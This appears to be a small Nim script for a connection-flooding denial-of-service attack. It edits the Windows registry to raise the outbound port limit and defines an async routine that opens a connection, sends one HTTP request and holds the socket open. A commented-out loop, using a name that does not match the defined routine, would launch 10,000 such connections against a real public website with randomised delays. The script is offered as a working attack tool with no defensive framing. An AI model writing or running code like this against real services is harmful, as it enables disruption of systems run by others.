import asyncdispatch, asyncnet, random, strutils, winregistry, net

proc winFix(enable: bool): void =
  var
    h: RegHandle
  try:
    h = open("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", samWrite)
    h.writeInt32("MaxUserPort",65535)
  except OSError:
    echo "err: ", getCurrentExceptionMsg()
  finally:
    close(h)

proc SessionGrb1(target: string, port: Port, delay: int) {.async.} =
  var socket = newAsyncSocket()
  try:
    await socket.connect(target, port)
    echo "Connected to " & target & ":" & intToStr(int(port))
    await socket.send("GET / HTTP/1.1\r\nHost: " & target & "\r\n\r\n")
    await sleepAsync(delay)
    socket.close()
  except:
    echo "Connection to " & target & ":" & intToStr(int(port)) & " failed: " & getCurrentExceptionMsg()

#[
randomize()
for i in 0..10000:
  let delay = rand(5000..15000)
  asyncCheck stealthyConnection("www.google.com", Port(80), delay)

runForever()
]#
